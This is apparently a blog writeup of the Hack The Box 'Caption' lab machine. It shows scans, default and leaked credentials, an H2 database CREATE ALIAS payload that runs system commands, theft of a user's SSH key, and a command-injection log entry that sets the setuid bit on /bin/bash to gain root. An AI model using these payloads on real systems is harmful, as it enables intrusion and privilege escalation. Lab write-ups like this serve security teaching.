---
layout: post
title: "Caption HTB writeup"
subtitle: "Walkethrough for the Caption HTB machine."
date: 2024-09-19 23:45:13
background: '/img/posts/04.jpg'

---

## Report

Beginning with the usual `nmap` scan  

```bash
nmap 10.129.73.39 -p- -sV
```

We get a very weird output  

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916181944.png" alt="1" style="width:700px; height:auto;">
<br/> 

`nmap` could not verify the Versions running but we get 3 open `ports`: 

* `22:SSH`
* `80: HTTP`
* `8080:HTTP`

Beginning with the standard methodology, we interact with `port 80`  

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916182210.png" alt="1" style="width:700px; height:auto;">
<br/> 

We get the usual redirection to a domain `caption.htb`  
Adding it to `/etc/hosts` file 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916182319.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a login portal 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916182903.png" alt="1" style="width:700px; height:auto;">
<br/>

Default login did not work.  
Chose not to spend much time on this attack vector before checking the rest of the ports.  
 Interacting with `port 8080`, we get a `GitBucket` webpage 
 
 <br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916183057.png" alt="1" style="width:700px; height:auto;">
<br/>

When clicking on `sign in`, we are prompted to a login portal 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916185720.png" alt="1" style="width:700px; height:auto;">
<br/>

Trying `root:root` and it worked  

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916185750.png" alt="1" style="width:700px; height:auto;">
<br/>

We have 2 repositories `Logservice` and `Caption-Portal`  
The `Logservice`  repo helps in log correlation using the `thrift` service

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916193256.png" alt="1" style="width:700px; height:auto;">
<br/>

The `Caption-Portal` repo is the service running on `port 80` (I assumed) 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916193652.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the last commits

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916194323.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see in the Update access control  commit some credentials

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916195826.png" alt="1" style="width:700px; height:auto;">
<br/>

`margo:vFr&cS2#0!`  
Trying the credentials on the login page found on `port 80` and it worked  
We are welcomed with an `index page` 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916195938.png" alt="1" style="width:700px; height:auto;">
<br/>

Following standard methodology and viewing `source code` but lead us to nowhere  
Beginning directory brute forcing 

```bash
gobuster dir -u="http://caption.htb/" -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt,zip,sh
```

We get a weird output 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240916200247.png" alt="1" style="width:700px; height:auto;">
<br/>

All the `endpoint` in the `firewall` directory is redirected to a single point and it is the `/` directory. Will keep that in mind and look at that later.  

Checking `Gitbucket` on `port 8080`  

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917213139.png" alt="1" style="width:700px; height:auto;">
<br/>

After clicking on `System Administration/Database viewer` 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917213211.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `terminal` where we can write `SQL` queries to be executed.  
Testing for the service by giving it an arbitrary value, a service name was exposed. 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917213324.png" alt="1" style="width:700px; height:auto;">
<br/>

`H2 database`.  
Looking for exploits, found this [link](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) a `SQL injection` can be abused.  
By using this code 

```java
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917214740.png" alt="1" style="width:700px; height:auto;">
<br/>

We can create an Alias that can execute `System commands` and we can call it by using this.

```java
CALL SHELLEXEC('id')
```

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917214818.png" alt="1" style="width:700px; height:auto;">
<br/>

Trying to pop out a `reverse shell` but it could not be possible.   
Reading the `/home/margo` directory, a `.ssh` directory was discovered 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917214909.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `private SSH key` 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917214935.png" alt="1" style="width:700px; height:auto;">
<br/>

Reading the file, it is displayed in a weird format 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917215011.png" alt="1" style="width:700px; height:auto;">
<br/>

To adjust that, `Base64` conversion was used 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917215039.png" alt="1" style="width:700px; height:auto;">
<br/>

 Copying the file to our local machine, decoding and give it the correct permissions to `SSH` 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917215242.png" alt="1" style="width:700px; height:auto;">
<br/>

Following our standard methodology, we checked `Internal ports` running 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240917215352.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `services` running on the background as `root`

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920203920.png" alt="1" style="width:700px; height:auto;">
<br/>


`server.go` is identified to be running as `root` but the `source code` is inaccessible as it is located in `/root` which is inaccessible for us as `margo` user.  
Going back to `Gitbucket`, Checking the other repository, `Logservice`, `server.go` can be identified and the `source code` can be read 

``` go
    package main
     
    import (
        "context"
        "fmt"
        "log"
        "os"
        "bufio"
        "regexp"
        "time"
        "github.com/apache/thrift/lib/go/thrift"
        "os/exec"
        "log_service"
    )
     
    type LogServiceHandler struct{}
     
    func (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath string) (r string, err error) {
        file, err := os.Open(filePath)
        if err != nil {
            return "", fmt.Errorf("error opening log file: %v", err)
        }
        defer file.Close()
        ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
        userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
        outputFile, err := os.Create("output.log")
        if err != nil {
            fmt.Println("Error creating output file:", err)
            return
        }
        defer outputFile.Close()
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            line := scanner.Text()
            ip := ipRegex.FindString(line)
            userAgentMatch := userAgentRegex.FindStringSubmatch(line)
            var userAgent string
            if len(userAgentMatch) > 1 {
                userAgent = userAgentMatch[1]
            }
            timestamp := time.Now().Format(time.RFC3339)
            logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
            exec.Command{"/bin/sh", "-c", logs}
        }
        return "Log file processed",nil
    }
     
    func main() {
        handler := &LogServiceHandler{}
        processor := log_service.NewLogServiceProcessor(handler)
        transport, err := thrift.NewTServerSocket(":9090")
        if err != nil {
            log.Fatalf("Error creating transport: %v", err)
        }
     
        server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
        log.Println("Starting the server...")
        if err := server.Serve(); err != nil {
            log.Fatalf("Error occurred while serving: %v", err)
        }
    }
```

`Thrift` library can be identified and we know it is running on `port 9090` from the `source code`.  
Local port forwarding  

```bash
ssh -L 9090:127.0.0.1:9090 margo@caption.htb -i id_rsa
```

We need to write a `script` to interact with this service.  
First of all we need to define a `thrift` file, which is already defined in the `Logservice` repository under the name of `log_service.thrift`.

```thrift
    namespace go log_service
     
    service LogService {
        string ReadLogFile(1: string filePath)
    }
```

Creating the file 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920204955.png" alt="1" style="width:700px; height:auto;">
<br/>

After defining the `Thrift` file, we will need to generate the `Python` client code using the `Thrift` compiler  

```bash
thrift --gen py log_service.thrift
```

After running the command, the directory will look like this 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920205136.png" alt="1" style="width:700px; height:auto;">
<br/>

Then create the `python` script that will interact with the `server` 

```python
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService

def main():
    # Set up the transport and protocol
    transport = TSocket.TSocket('localhost', 9090)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)
    
    # Create a client
    client = LogService.Client(protocol)

    # Connect to the server
    transport.open()

    # Call the service method
    try:
        result = client.ReadLogFile('/path/to/your/logfile.log')
        print(f'Server Response: {result}')
    except Exception as e:
        print(f'Error: {e}')
    
    # Close the connection
    transport.close()

if __name__ == "__main__":
    main()

```

Create the `client.py` and put it in the `gen-py` directory 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920205713.png" alt="1" style="width:700px; height:auto;">
<br/>

Create a dummy file in the `/tmp` directory in the remote machine and test the script

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920205812.png" alt="1" style="width:700px; height:auto;">
<br/>

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920205824.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see that the Log file was processed successfully.   
Analyzing the `source code`, we can see a potential `Command injection` here 

```go
 logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
            exec.Command{"/bin/sh", "-c", logs}
```

We can inject commands like this 

```bash
 {"user-agent":"'; command_here ; #", "ip":"1.2.3.4"}

```

Creating a malicious Log file containing this command

```bash
 {"user-agent":"'; chmod +s /bin/bash ; #", "ip":"1.2.3.4"}
```

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920210147.png" alt="1" style="width:700px; height:auto;">
<br/>

Change the `client.py` to point to this newly created log file

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920210457.png" alt="1" style="width:700px; height:auto;">
<br/>

Run the Client script and now try to open a `bash shell` and drop the privileges. 

<br/> 
<img src="/img/Caption_Screenshots/Pasted image 20240920210457.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was pawned successfully 

<br/> 
<img src="/img/Caption_Screenshots/Screenshot_1.png" alt="1" style="width:700px; height:auto;">
<br/>
